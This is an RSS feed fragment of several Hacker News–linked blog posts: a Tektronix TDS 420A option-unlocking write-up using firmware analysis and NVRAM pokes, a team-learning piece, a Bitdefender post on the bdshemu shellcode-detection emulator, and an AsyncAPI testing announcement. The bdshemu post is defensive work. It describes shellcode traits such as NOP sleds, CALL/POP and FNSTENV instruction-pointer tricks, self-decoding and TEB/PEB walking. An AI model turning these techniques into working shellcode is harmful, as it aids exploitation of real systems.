  <li><a href="#the-key-to-enabling-option-2f---advanced-dsp-math" id="markdown-toc-the-key-to-enabling-option-2f---advanced-dsp-math">The Key to Enabling Option 2F - Advanced DSP Math</a></li>
  <li><a href="#options-05-and-2f-enabled" id="markdown-toc-options-05-and-2f-enabled">Options 05 and 2F Enabled!</a></li>
  <li><a href="#option-1m---120k-sample-points---a-different-story" id="markdown-toc-option-1m---120k-sample-points---a-different-story">Option 1M - 120K Sample Points - A Different Story</a></li>
  <li><a href="#in-search-of-the-missing-memory" id="markdown-toc-in-search-of-the-missing-memory">In Search of the Missing Memory</a></li>
  <li><a href="#success-at-last" id="markdown-toc-success-at-last">Success at Last!</a></li>
  <li><a href="#conclusion" id="markdown-toc-conclusion">Conclusion</a></li>
  <li><a href="#references" id="markdown-toc-references">References</a></li>
</ul>



<p>I wrote <a href="https://tomverbeure.github.io/2020/06/27/In-the-Lab-Tektronix-TDS420A.html#the-tektronix-tds-420a-in-brief">earlier</a>
about the optional features of TDS 400 series of oscilloscopes:</p>

<ul>
  <li>Option 05: Video Trigger</li>
  <li>Option 13: RS-232/Centronics Hardcopy Interface</li>
  <li>Option 1F: File System/Floppy</li>
  <li>Option 2F: Advanced DSP Math</li>
  <li>Option 1M: 120k waveform sample points</li>
</ul>

<p>Most scopes, including mine, come with options 13 and 1F, but the remaining ones are less common.</p>

<p>The video triggering and advanced DSP math options are pure firmware functions, but even 
the 120k sample points option seemed like something that could be enabled with a software hack, since
the signal acquisition board has the 512KB of RAM available to store the data.</p>

<p>Here, I’ll describe how the TDS 400 series manages option enablement, and
how you can hack the scope into getting them to work.</p>



<p>Using Ghidra and the debug console, I figured out how the scope manages hardware
features: it has a function called <code>hwAccountantQuery</code> that has a single
parameter which I’ll call the ‘feature ID’.</p>

<p><code>hwAccountantQuery</code> will return an integer value for that feature ID. These values
can be boolean in nature (“Is a certain feature present or not”) or can be the
amount of DSP memory etc.</p>

<p>Here’s a very non-exhaustive list of codes that I’ve been able to identify:</p>

<div><div><pre><code>0x20d: number of scope channels
0x20f: size of acquisition RAM
0x216: ProbeD2MemSize
0x248: CPU clock period
0x255: InstrumentNameStringPtr
0x271: hwProbeSpecialDiagModeActive
0x2a0: hwProbeSpecialDiagLoopCount
0x2a1: hwProbeSpecialDaigSeqId
0x2b8: 30000 points -&gt; value when 1M option is not possible
0x2bf: TDS420A
0x2d2: RS232 Debug uart present
0x317: MathPak      -&gt; this is the advanced DSP math function
0x461: Floppy drive present
0x537: flashRomDateStringPtr
0x54c: TDS410A
0x560: TDS430A
0x700: hwProbeTvTrigPresent
</code></pre></div></div>

<p><code>hwAccountantQuery</code> calls <code>hwAccountantGetValue</code>. The first part of that function looks liks this:</p>

<p><img src="https://tomverbeure.github.io/assets/tds420a/hwAccountantGetValue.png" alt="hwAccountantGetValue"></p>

<p>It’s a large <code>if-then-else</code> or <code>case</code> statement that calls a dedicated function for a particular
feature ID.</p>



<p>Did you see <code>_hwProbeTvTrigPresent()</code>? That’s the function that checks
if the video triggering feature should be enabled:</p>

<p><img src="https://tomverbeure.github.io/assets/tds420a/hwProbeTvTrigPresent.png" alt="hwProbeTvTrigPresent"></p>

<p>And there we have it! To enable “Option 05 - Video Triggering”, all you need to do
is store a non-zero value in non-volatile RAM location 7!</p>

<p><em>This is not a shocking new discovery: plenty of online sources already mentioned this,
but it’s great to confirm it from first principles, by going to the source.</em></p>



<p>Internally, the Advanced Math DSP is called “MathPak”. Just like for video triggering, 
the <code>hwAccountGetValue</code> function issues a call to <code>hwProbeMathPakPresent()</code>:</p>

<p><img src="https://tomverbeure.github.io/assets/tds420a/hwProbeMathPakPresent.png" alt="hwProbeMathPakPresent"></p>

<p>Option 2F simply relies on a non-zero value in NVRAM location 9!</p>



<p>It’s now just a matter of issuing the following 2 commands on the debug console:</p>

<div><div><pre><code>libManagerWordAtPut 0x50007, 1
libManagerWordAtPut 0x50009, 1
</code></pre></div></div>

<p>My scope booted up with this image:</p>

<p><img src="https://tomverbeure.github.io/assets/tds420a/options_05_and_2f_enabled.jpg" alt="Options 05 and 2F enabled"></p>

<p>Success! I’m now the proud owner of a scope that supports an entirely obsolete video triggering
mode, and a FFT math option!</p>

<p>Video Triggering Menu:
<img src="https://tomverbeure.github.io/assets/tds420a/video_triggering_features.jpg" alt="Video triggering features"></p>

<p>Live FFT of a 1kHz square wave:
<img src="https://tomverbeure.github.io/assets/tds420a/fft.jpg" alt="FFT"></p>



<p>Unfortunately, the <code>case</code> statement is only a small part of the <code>hwAccountGetValue</code> function: most
feature checking functions are performed by looping through an array of structs that
have the feature ID and a function pointer to the checking function. It’s a bit harder to figure 
out in Ghidra, but we already know that the function names to enable options start with <code>hwProbe</code>.</p>

<p>With Ghidra, we can filter on this, and that gives the <code>hwProbe1MOption</code> and the 
<code>hwProbe1MPresent</code> functions.</p>

<p><code>hwProbe1MPresent</code> looks very familiar:</p>

<p><img src="https://tomverbeure.github.io/assets/tds420a/hwProbe1MPresent.png" alt="hwProbe1MPresent"></p>

<p>Just like for the 05 and 2F options, we need to set a specific byte in the
NVRAM:</p>

<div><div><pre><code>libManagerWordAtPut 0x50006, 1
</code></pre></div></div>

<p><code>hwProbe1MOption</code> is a different story:</p>

<p><img src="https://tomverbeure.github.io/assets/tds420a/hwProbe1MOption.png" alt="hwProbe1MOption"></p>

<p>When you run <code>hwProbe1MOption</code> on the command line, the function returns a 0.</p>

<p>Feature IDs 0x216 and 0x20f are also part of the array of structs. They call the functions
<code>hwProbeD2MemSize</code> and <code>hwProbeAcqMemSize</code> respectively.</p>

<p><img src="https://tomverbeure.github.io/assets/tds420a/hwProbeTable.png" alt="hwProbe table"></p>

<p><code>hwProbeD2MemSize</code> and <code>hwProbeAcqMemSize</code> both run a test to check the amount of RAM that 
is populated on the board.</p>

<p>When you run these query commands on the debug console, you get:</p>

<div><div><pre><code>hwAccountantQuery(0x216)    
262143
hwAccountantQuery(0x20f)    
131071
</code></pre></div></div>

<p>It’s now clear why option 1M doesn’t get enabled after changing the NVRAM value: 
feature ID 0x20f is fine (131071/0x1ffff is larger than 0x1fffe), but feature ID 0x216 is not 
(262143/0x3ffff is smaller than 0xffffe).</p>

<p>Whatever it is used for, the amount of “D2” memory in the scope is too small.</p>



<p>This finally gave me the crucial hint to start looking at other PCBs inside the scope and
try to find if there’s a place with empty footprints for RAM chips.</p>

<p>I call this the DSP PCB. Luckily, it’s a board that’s easy to remove from the chassis, without 
fragile flex cables or connectors.</p>

<p><img src="https://tomverbeure.github.io/assets/tds420a/dsp_pcb.jpg" alt="DSP PCB"></p>

<p>Look at those 6 beautiful, unused footprints!</p>

<p><img src="https://tomverbeure.github.io/assets/tds420a/ram_footprints_closeup.jpg" alt="RAM footprints closeup"></p>

<p>The RAM chips are M5M51008 with a 100ns speed rating, made by Mitsubishi LSI.</p>

<p><img src="https://tomverbeure.github.io/assets/tds420a/memory_datasheet.jpg" alt="Memory Datasheet"></p>

<p>Surprisingly, Digikey still carries these parts: they’re now made by Rochester
Electronics, and only available in 70ns or 55ns version, but faster is better,
so that shouldn’t be a problem.</p>

<p>They’re cheap too at just $2.56 a piece.</p>

<p>The only issue is a minimum order quantity of 100 parts. $256 for a feature
on a 25 years old $190 oscilloscope is a bit too much! Luckily, the parts
are available at various Chinese chip brokers: I was able to buy them at 
<a href="https://utsource.net/">UTSource</a> for just $1.81 a piece. Even when buying 10 
of them (for redundancy), shipping was the biggest part of the cost:</p>

<p><img src="https://tomverbeure.github.io/assets/tds420a/memory_order.png" alt="Memory Order"></p>

<p><em>Once ordered, UTSource let me know that these parts were refurbished…</em></p>

<p>A few days later, the parts arrived at my front door, ready to be populated
on the DSP board:</p>

<p><img src="https://tomverbeure.github.io/assets/tds420a/dsp_board_before_surgery.jpg" alt="DSP Board Before Surgery"></p>

<p>Note how I did not disconnect the battery that’s wired to the board: it’s used to
permanently provide power to those 4 RAMs chips on the left that are encased into 
some transparant polymer gu. Removing the battery will result in lost calibration
data (or so they say.)</p>

<p>I used a regular soldering iron instead of a hot air gun to attach the 6 RAMs:
there was enough solder on the pads and I’m most comfortable doing it that way.
Afterwards I Ohm’ed out most of the pins, and I’m glad I did because
there were some open connections.</p>

<p>The end result isn’t perfect, but it’s good enough:</p>

<p><img src="https://tomverbeure.github.io/assets/tds420a/rams_populated.jpg" alt="RAMs Populated"></p>



<p>With the RAM populated, it’s time to power on the scope and check the result
of the enhancement surgery!</p>

<p>The scope bootup screen looks good:</p>

<p><img src="https://tomverbeure.github.io/assets/tds420a/option_1m_enabled.jpg" alt="Option 1M enabled"></p>

<p>And this formerly grayed out 12000 points menu option is now available:</p>

<p><img src="https://tomverbeure.github.io/assets/tds420a/120k_points.jpg" alt="120K Points"></p>

<p>Victory at Last!</p>



<p>The TDS 420A is an old oscilloscope, and even with those 3 new options enabled, it’s
far inferior to my Siglent 2304X or even my HP 54825A (Windows 95!) loaner.</p>

<p>120K sample points is obviously better than 30K, but it still pales in comparison
to the 140M sample points of the Siglent.</p>

<p>So what then was the point of this whole exercise?</p>

<p>I got a close up view of oscilloscope internals, I learned Ghidra from scratch and
applied it on a real, non-trival project, I added RAM to a 25 year old oscilloscope 
and it worked, I spent tons of late night hours decoding firmware, and 
I had an unreasonable amount of fun doing so.</p>

<p>I even started to appreciate the Tektronix user interface a little bit!</p>

<p>It was time well spent.</p>

<p>For now, the scope will remain on my bench while I start adding Tektronix support 
in glscopeclient. That was the whole point of acquiring the scope to being with!</p>

<p>And if it turns out that it’s really too limited for my use, I can always
sell it back on eBay, this time with 3 additional features enabled.</p>



<ul>
  <li>
    <p><a href="https://www.eevblog.com/forum/testgear/hacking-my-tds460a-to-have-options-1m2f/">Hacking my TDS460A to have options 1M/2F?</a></p>
  </li>
  <li>
    <p><a href="https://forum.tek.com/viewtopic.php?t=140268">TDS420 Options Possible?</a></p>
  </li>
  <li>
    <p><a href="http://videohifi17.rssing.com/chan-62314146/all_p49.html">Upgrade Tektronix: FFT analyzer</a></p>

    <p>Story about upgrading the CPU board from 8MB to 16MB on a TDS420 (not the 420A?) and then FFT in the
  NVRAM.</p>
  </li>
  <li>
    <p><a href="https://www.youtube.com/watch?v=iJt2O5zaLRE">Enabling FFT option in Tektronix TDS 540A oscilloscope</a></p>

    <p>Not very useful for 420A owners: enables FFT by copying NVRAM EEPROM.</p>
  </li>
  <li>
    <p><a href="https://www.eevblog.com/forum/testgear/tds420-with-lost-options/msg2032465/?PHPSESSID=021nnvu02ca549sh5le7s9r8i5#msg2032465">TDS420 with lost options</a></p>

    <p>Specific comment about how to enable options on the 420A over GPIB. I wasn’t able to get this to 
  work for some reason.</p>
  </li>
  <li>
    <p><a href="http://www.ko4bb.com/getsimple/index.php?id=enable-tds754d-options">Enable TDS754D Options using GPIB</a></p>

    <p>Another one about using GPIB.</p>
  </li>
</ul>


  </div>
</article>

      </div>
    </div></div>]]>
            </description>
            <link>https://tomverbeure.github.io/2020/07/11/Option-Hacking-the-Tektronix-TDS-420A.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25057162</guid>
            <pubDate>Wed, 11 Nov 2020 10:22:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Forming Professional Dev Team Habits]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25057078">thread link</a>) | @morchen
<br/>
November 11, 2020 | https://swimm.io/blog/2020-07-09-professionalism-by-forming-a-team-habit/ | <a href="https://web.archive.org/web/*/https://swimm.io/blog/2020-07-09-professionalism-by-forming-a-team-habit/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section data-v-f94c7cca=""> <!----> <div data-v-0cf44990="" data-v-f94c7cca=""><div><p>How does your workplace cultivate an environment of team development? How do you make sure your engineers have time for creative ideas and professional development, all the while meeting sprints, deadlines and deliverables? While branded photogenic team building activities are common in many tech companies — especially with rapidly growing teams, this strategy fails to help grow together as professionals and misses the aim in the long run.</p>
<p>For long, I’ve been toying with such questions, asking myself — how can companies keep “the fun bits”, but also cultivate purpose and a culture of self and team professional development. In this post you’ll find the pilot we’re launching at Swimm: the main goals of such a pilot and why we believe in it, as well as the execution strategy. We will follow-up and share our experiences in future posts.</p>
<h3><strong>The Why: Delivering Code Excellence</strong></h3>
<p><strong>Professionalism</strong>. First, we want to create a culture where all of our team members learn new things, on an ongoing basis. To become professionals, we need to keep learning all the time. To stay happy and challenged at work we need access to resources, and need our managers to invest in our development.</p>
<p><strong>Innovation</strong>. Second, reviewing together new topics and brainstorming on how they can be integrated into our products will provide new ideas and make us constantly rethink our current approaches.</p>
<p>While thinking about a way to achieve these goals, I was looking for best practice, study cases and models that worked well or gloriously failed in other places in the tech industry. Specifically, I was inspired by <a href="https://medium.com/@Idan.Bassuk/a-proven-methodology-for-becoming-an-a-i-expert-32d43887cb1e">this post</a> by Idan Bassuk from <strong>Aidoc</strong>. I contacted Idan and he was very kind to answer all my questions. I learned that they’ve been continuing their “Deep Snips” (where one of their team members learns a subject and presents it to the team) for the past 3 years, and that he still believes this method helps achieve its goals. I learned from their experience that many of their talks resulted in actual impact to their products. This gave me confidence that this method can indeed have a meaningful impact, and I was now more eager than before to put this to the test.</p>
<h3><strong>The How: Swimminars X 2 Weeks</strong></h3>
<p><strong>Swimminars.</strong> Every other week, one of our engineers will get to learn something new that they wish to dive deeper into and learn. It can be about anything at all, as long as it’s technological, and can be applied to our product(s), even if not in the foreseeable future. Then, the engineer will give a lecture, sharing their research and new knowledge with the team. After every session, we will also publish a blog post, summarising the lecture for our community or new hires to use if they wish.</p>
<p><strong>Technicalities</strong>. We plan to divide the session into two parts — the first will be technical, an in-depth overview of the relevant subject (will be covered on our blog posts). The second part will include holding internal discussions on the possible utilisation, adoption and impacts of the topic on our product(s). Are we already relying on some of this knowledge? Can it help us tackle a current or future issue? Perhaps we need to consider implementing it now?</p>
<p>During the two weeks of the engineer’s turn, (s)he gets as much time as needed to learn the subject and prepare the lecture. This will be prioritised over other tasks, and we assume it will take between one and two days. This is a huge commitment — with all the tasks that we have as a startup, every day is precious. Still, we decided that the impact we are hoping for is so valuable that it’s worth the price, and that we are willing to make the experiment.</p>
<h3><strong>Piloting: Managing Expectations</strong></h3>
<p><strong>Risks</strong>. Yet, as always, it’s easier said than done. Indeed this can go wrong in different ways — time management vs efficiency, getting to a high level of interesting presentations and useful technological insight, or getting every one’s voice heard on the team in a manner that compliments them. It’s a learning on the go activity. So we’re up for a team challenge.</p>
<p><strong>Upsides</strong>. For the duration of our team pilot, every other week, the entire dev team will get to learn something new while taking turns deepening knowledge, improving writing and presentation skills and becoming experts within the team on their Swimminar topics. This team exercise will provide each engineer individually and the team as whole, positive experiences of success. We hope.</p>
<p>I will be the first to give a Swimminar — specifically, on <strong>git internals</strong>. How it goes from there, only time will tell. We promise to report back on how this experiment is working for us. Stay tuned.</p>
<p><em>Swimm is a tool helping engineers contribute to any codebase faster and better with automatically generated hints and codebase insight.</em></p>
<p><em>Omer Rosenbaum, Swimm’s Chief Technology Officer. Cyber training expert and Founder of Checkpoint Security Academy. Author of <a href="https://data.cyber.org.il/networks/networks.pdf">Computer Networks (in Hebrew)</a>. Visit My <a href="https://www.youtube.com/watch?v=79jlgESHzKQ&amp;list=PL9lx0DXCC4BMS7dB7vsrKI5wzFyVIk2Kg">YouTube Channel</a>.</em></p>
</div></div> </section></div>]]>
            </description>
            <link>https://swimm.io/blog/2020-07-09-professionalism-by-forming-a-team-habit/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25057078</guid>
            <pubDate>Wed, 11 Nov 2020 10:04:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Bdshemu: Bitdefender shellcode emulator]]>
            </title>
            <description>
<![CDATA[
Score 65 | Comments 23 (<a href="https://news.ycombinator.com/item?id=25057062">thread link</a>) | @mdontu
<br/>
November 11, 2020 | https://hvmi.github.io/blog/2020/11/11/bdshemu.html | <a href="https://web.archive.org/web/*/https://hvmi.github.io/blog/2020/11/11/bdshemu.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <h2 id="introduction">Introduction</h2>

<p>Detecting exploits is one of the major strengths of Hypervisor Memory Introspection (HVMI). The ability to monitor guest physical memory pages against different kinds of accesses, such as write or execute, allows HVMI to impose restrictions on critical memory regions: for example, stack or heap pages can be marked as being non-executable at the EPT level, so when an exploit manages to gain arbitrary code execution, the introspection logic would step in and block the execution of the shellcode.</p>

<p>In theory, intercepting execution attempts from memory regions such as the stack or the heap should be enough to prevent most of the exploits. Real life is often more complicated, and there are many cases where legit software uses techniques that may resemble on attack - Just In Time compilation (JIT) in browsers is one good example. In addition, an attacker may store its payload in other memory regions, outside the stack or the heap, so a method of discerning good code from bad code is useful.</p>

<p>We will talk in this blog post about the Bitdefender Shellcode Emulator, or <a href="https://github.com/bitdefender/bddisasm">bdshemu</a> for short. bdshemu is a library capable of emulating basic x86  instructions (in all modes - 16, 32 and 64 bit), while observing shellcode-like behavior. Legitimate code, such as JIT code, will look different compared to a traditional shellcode, so this is what bdshemu is trying to determine: whether the emulated code behaves like a shellcode or not.</p>

<h2 id="bdshemu-overview">bdshemu Overview</h2>

<p>bdshemu is a library written in C, and is part of the bddisasm project (and of course, it makes use of bddisasm for instruction decoding). The bdshemu library is built to emulate x86 code only, so it has no support for API calls. In fact, the emulation environment is highly restricted and stripped down, and there are only two memory regions available:</p>

<ul>
  <li>The page(s) containing the emulated code;</li>
  <li>The stack;</li>
</ul>

<p>Both of these memory regions are virtualized, meaning that they are in fact copies of the actual memory being emulated, so modifications made to them don’t affect the actual system state. Any access made by the emulated code outside of these two areas (which we will call the shellcode and the stack, respectively) will trigger immediate emulation termination. For example, an API call will automatically cause a branch outside the shellcode region, thus terminating emulation. However, in bdshemu, all we care about is instruction-level behavior of the code, which is enough to tell us whether the code is malicious or not.</p>

<p>While bdshemu provides the main infrastructure for detecting shellcodes inside a guest operating-system, it is worth noting that this is not the only way HVMI determines that execution of a certain page is malicious - two other important indicators are used:</p>

<ul>
  <li>The executed page is located on the stack - this is common with stack-based vulnerabilities;</li>
  <li>The stack is pivoted - when a page is first executed and the <code>RSP</code> register points outside the normal stack allocated for the thread;</li>
</ul>

<p>These two indicators are enough on their own to trigger an exploit detection. If these are not triggered, bdshemu is used to take a good look at the executed code, and decide if it should be blocked or not.</p>

<h2 id="bdshemu-architecture">bdshemu Architecture</h2>

<p>bdshemu is created as a standalone C library, and it only depends on bddisasm. Working with bdshemu is fairly simple, as just like bddisasm, it is a single-API library:</p>
<div><div><pre><code><span>SHEMU_STATUS</span>
<span>ShemuEmulate</span><span>(</span>
    <span>SHEMU_CONTEXT</span> <span>*</span><span>Context</span>
    <span>);</span>
</code></pre></div></div>

<p>The emulator expects a single <code>SHEMU_CONTEXT</code> argument, containing all the needed information in order to emulate the suspicious code. This context is split in two sections - input parameters and output parameters. The input parameters must be supplied by the caller, and they contain information such as the code to be emulated, or initial register values. The output parameters contain information such as what shellcode indicators bdshemu detected. All these fields are well documented in the source-code.</p>

<p>Initially, the context is filled in with the following main information (please note that emulation outcome may change depending on the value of the provided registers and stack):</p>

<ul>
  <li>Input registers, such as segments, general purpose registers, MMX and SSE registers; they can be left 0, if they are not known, or if they are irrelevant;</li>
  <li>Input code, which is the actual code to be emulated;</li>
  <li>Input stack, which can contain actual stack contents, or can be left 0;</li>
  <li>Environment info, such as mode (32 or 64 bit), or ring (0, 1, 2 or 3);</li>
  <li>Control parameters, such as minimum stack-string length, minimum NOP sled length or the maximum number of instructions that should be emulated;</li>
</ul>

<p>The main output parameter is the <code>Flags</code> field, which contains a list of shellcode indicators detected during the emulation. Generally, a non-zero value of this field strongly suggests that the emulate code is, in fact, a shellcode.</p>

<p>bdshemu is built as a plain, quick and simple x86 instruction emulator: since it only works with the shellcode itself and a small virtual stack, it doesn’t have to emulate any architectural specifics - interrupts or exceptions, descriptor tables, page-tables, etc. In addition, since we only deal with the shellcode and stack memory, bdshemu does not do memory access checks, since it doesn’t even allow accesses to other addresses. The only state apart from the registers that can be accessed is the shellcode itself and the stack, and both are copies of the actual memory contents - the system state is never modified during the emulation, only the provided <code>SHEMU_CONTEXT</code> is. This makes bdshemu extremely fast, simple, and lets us focus on its main purpose: detecting shellcodes.</p>

<p>As far as instruction support goes, bdshemu supports all the basic x86 instructions, such as branches, arithmetic, logic, shift, bit manipulation, multiplication/divison, stack access and data transfer instructions. In addition, it also has support for other instructions, such as some basic MMX or AVX instructions - <code>PUNPCKLBW</code> or <code>VPBROADCAST</code> are two good examples.</p>

<h2 id="bdshemu-detection-techniques">bdshemu Detection Techniques</h2>

<p>In order to determine whether an emulated piece of code behaves like a shellcode, there are several indicators bdshemu uses.</p>

<h3 id="nop-sled">NOP Sled</h3>

<p>This is the classic presentation of shellcodes; since the exact entry point of the shellcode when gaining code execution may be unknown, attackers usually prepend a long sequence of <code>NOP</code> instructions, encoding <code>0x90</code>. The parameters for the NOP-sled length can be controlled when calling the emulator, via the <code>NopThreshold</code> context field. The default value is <code>SHEMU_DEFAULT_NOP_THRESHOLD</code>, which is <code>75</code>, meaning that minimum 75% of all the emulated instruction must be <code>NOP</code>.</p>

<h3 id="rip-load">RIP Load</h3>

<p>Shellcodes are designed to work correctly no matter what address they’re loaded at. This means that the shellcode has to determine, dynamically, during runtime, the address it was loaded at, so absolute addressing can be replaced with some form of relative addressing. This is typically achieved by retrieving the value of the instruction pointer using well-known techniques:</p>

<ul>
  <li><code>CALL $+5/POP ebp</code> - executing these two instructions will result in the value of the instruction pointer being stored in the <code>ebp</code> register; data can then be accessed inside the shellcode using offsets relative to the <code>ebp</code> value;</li>
  <li><code>FNOP/FNSTENV [esp-0xc]/POP edi</code> - the first instruction is any FPU instruction (not necessarily <code>FNOP</code>), and the second instruction, <code>FNSTENV</code> saves the FPU environment on the stack; the third instruction will retrieve the <code>FPU Instruction Pointer</code> from <code>esp-0xc</code>, which is part of the FPU environment, and contains the address of the last FPU executed - in our case, <code>FNOP</code>; from there on, addressing relative to the <code>edi</code> can be used to access shellcode data;</li>
</ul>

<p>Internally, bdshemu keeps track of all the instances of the instruction pointer being saved on the stack. Later loading that instruction pointer from the stack in any way will result in triggering this detection. Due to the way bdshemu keeps track of the saved instruction pointers, it doesn’t matter when, where or how the shellcode attempts to load the RIP in a register and use it, bdshemu will always trigger a detection.</p>

<p>In 64 bit, RIP-relative addressing can be used directly, since the instruction encoding allows it. However, surprisingly, a large number of shellcodes still use a classic method of retrieving the instruction pointer (generally the <code>CALL/POP</code> technique), which is somehow weird, but it probably indicated that 32 bit shellcodes were ported to 64 bit with minimal modifications.</p>

<h3 id="write-self">Write Self</h3>

<p>Most often, shellcodes come in encoded or encrypted forms, in order to avoid certain bad characters (for example, <code>0x00</code> in a shellcode that should resemble a string may break the exploit) or to avoid detection by security technologies (for example, AV scanners). This means that during runtime, the shellcode must decode itself (usually in-place), by modifying its own contents, and then executing the plain-text code. Typical methods of decoding involve <code>XOR</code> or <code>ADD</code> based decryption algorithms.</p>

<p>Certainly, bdshemu follows this kind of behavior, and keeps track internally of each modified byte inside the shellcode. Whenever the suspected shellcode writes any portion of itself, and then it executes it, the self-write detection will be triggered.</p>

<h3 id="tib-access">TIB Access</h3>

<p>Once a shellcode has gained code execution, it needs to locate several functions inside various modules, in order to carry its actual payload (for example, downloading a file, or creating a process). On Windows, the most common way of doing this is by parsing the user-mode loader structures, in order to locate the addresses where the required modules were loaded, and then locate the needed functions inside these modules. The sequence of structures the shellcode will access is:</p>

<ol>
  <li>The Thread Environment Block (<code>TEB</code>), which is located at <code>fs:[0]</code> (32 bit thread) or <code>gs:[0]</code> (64 bit thread);</li>
  <li>The Process Environment Block (<code>PEB</code>), which is located at <code>TEB+0x30</code> (32 bit) or <code>TEB+0x60</code> (64 bit)</li></ol></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://hvmi.github.io/blog/2020/11/11/bdshemu.html">https://hvmi.github.io/blog/2020/11/11/bdshemu.html</a></em></p>]]>
            </description>
            <link>https://hvmi.github.io/blog/2020/11/11/bdshemu.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25057062</guid>
            <pubDate>Wed, 11 Nov 2020 10:01:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Test your event-driven architecture with Microcks and AsyncAPI]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25057022">thread link</a>) | @derberg
<br/>
November 11, 2020 | https://www.asyncapi.com/blog/microcks-asyncapi-part1 | <a href="https://web.archive.org/web/*/https://www.asyncapi.com/blog/microcks-asyncapi-part1">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><img src="https://www.asyncapi.com/img/posts/microcks-asyncapi-part1/microcks-1.0.0-loves-asyncapi.webp" alt="Post cover image"><p>August 11th 2020 was the official announcement of <a href="https://microcks.io/blog/microcks-1.0.0-release/">Microcks 1.0.0</a> release and our first Microcks General Availability (GA) version to fully manage event-driven API through the support of <a href="https://www.asyncapi.com/">AsyncAPI</a> specification. <strong>This first post explains why we decided to start this project and provides more insights.</strong></p><p>For those who don't know <a href="https://microcks.io/">Microcks</a> yet: it is the ultimate Open source Kubernetes Native tool for Mocking and Testing all your APIs. With Microcks, you can turn your API contract, collection or SOAP UI projects into live mocks in a few seconds. For further information, please read <a href="https://microcks.io/blog/why-microcks/">"Why Microcks ?"</a>.</p><p>We are following the <a href="https://www.asyncapi.com/">AsyncAPI</a> specification initiative since day one and I clearly remember how the <a href="https://blog.hitchhq.com/introducing-the-asyncapi-specification-7feb57b460ae">first announcement back in 2017</a> resonated within our team ! We shared the same principles: Open source and community driven... and last but not least, 100% aligned with our vision that open specifications standards like <a href="https://www.openapis.org/">OpenAPI</a> is the ultimate way to move forward and perpetuate our mantra: unlock developers potential in an unpredictable and strongly innovative environment!</p><p>Since then, we have been in touch with our mutual communities and strategic users to see if we all embrace the idea of adding AsyncAPI testing and mocking support within Microcks.
Microcks community was very enthusiastic by the idea and problem this integration can solve. We have helped some users on their AsyncAPI use cases to grab valuable feedback on how to manage Microcks event-driven API integration. We learned a lot from different vertical industries, including tricky IoT &amp; Edge computing or fintech implementations.</p><p>Our communities clearly validate that it makes sense to have the same tool managing all their API whatever the type, open contract definition or design tool used. This is why, today Microcks supports open standards for contract definitions and mainstream open collaborative tools:</p><p><img src="https://www.asyncapi.com/img/posts/microcks-asyncapi-part1/microcks-supported-standards.webp" alt="microcks-supported-standards"></p><p>It took us a year to make, which explains why Microcks 1.0.0 release is already GA and the first tool on <a href="https://www.asyncapi.com/docs/tooling/#mocking">this topic</a><undefined> <span role="img" aria-label="winking face">😉</span> </undefined></p><p><img src="https://www.asyncapi.com/img/posts/microcks-asyncapi-part1/asyncapi-tool-tweet.webp" alt="asyncapi-tool-tweet"></p><p>This is a major step forward as we are convinced that the transition to cloud-native applications will strongly embrace event-based and reactive architecture. Thus the need to speed-up and govern event-based API like any other services mocking using Microcks will be crucial and a key success factor for any modern and agile software developments.</p><p>Microcks 1.0.0 provides a solid platform for simulating event-based API using message broker technologies like <a href="https://kafka.apache.org/">Apache Kafka</a> even before the publishing component has been developed. And once developed, it is then capable to validate that all the publisher sent events will be compliant with the defined specification, automatically from a CI/CD pipeline.</p><p>To demonstrate our commitment/vision and to <a href="https://www.asyncapi.com/blog/status-update-37-20/#proposal-for-more-formal-examples">improve AsyncAPI specifications</a> on our favorite topic: testing &amp; mocking, we have launched an upstream feature request in order to provide a formal type for message examples.</p><p><img src="https://www.asyncapi.com/img/posts/microcks-asyncapi-part1/call-to-action.webp" alt="call-to-action"></p><p>Please have a look at <a href="https://github.com/asyncapi/asyncapi/issues/329">this proposal #329</a> and share your opinion. At the moment, it is a part of <a href="https://github.com/asyncapi/asyncapi/milestone/17">AsyncAPI 2.1 milestone</a>.</p><p> <strong> In the next article, we will focus on Microcks + AsyncAPI use cases. Stay tuned.</strong></p><blockquote><p>And if you can't wait for text explanataions, do not hesitate having a look at the <a href="https://www.youtube.com/watch?v=pmRA4M-TWuE">AsyncAPI SIG Meeting #34 recording</a><undefined> for full illustrations of the capabilities. <span role="img" aria-label="winking face">😉</span></undefined></p></blockquote></article></div>]]>
            </description>
            <link>https://www.asyncapi.com/blog/microcks-asyncapi-part1</link>
            <guid isPermaLink="false">hacker-news-small-sites-25057022</guid>
            <pubDate>Wed, 11 Nov 2020 09:53:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Keyboardio Atreus: Yeah or Meh?]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25056988">thread link</a>) | @liveweird
<br/>
November 11, 2020 | https://no-kill-switch.ghost.io/keyboardio-atreus-yeah-or-meh-review/ | <a href="https://web.archive.org/web/*/https://no-kill-switch.ghost.io/keyboardio-atreus-yeah-or-meh-review/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article data-post-id="5faba45f5480d10039a1a829">
	

	<section>
